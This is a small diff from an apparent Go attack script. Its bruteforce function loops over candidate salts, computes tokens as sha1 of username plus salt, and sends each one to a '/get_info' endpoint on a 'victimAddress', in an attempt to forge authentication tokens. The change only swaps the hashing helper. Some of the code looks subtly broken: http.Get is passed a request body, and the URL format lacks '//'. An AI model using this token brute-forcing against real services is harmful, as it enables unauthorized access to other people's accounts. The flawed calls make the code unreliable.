@@ -34,7 +34,7 @@ func bruteforce(username string, salts map[string]bool) {
 		for salt := range salts {
 		// attempt to /get_info with token = sha1(username + salt)
 
-		values := map[string]string{"username": username, "token": GetBaseToken(username + salt)}
+		values := map[string]string{"username": username, "token": GetBaseHash(username + salt)}
 		jsonData, err := json.Marshal(values)
 
 		resp, err := http.Get(fmt.Sprintf("http:%s/get_info", victimAddress), bytes.NewBuffer(jsonData))
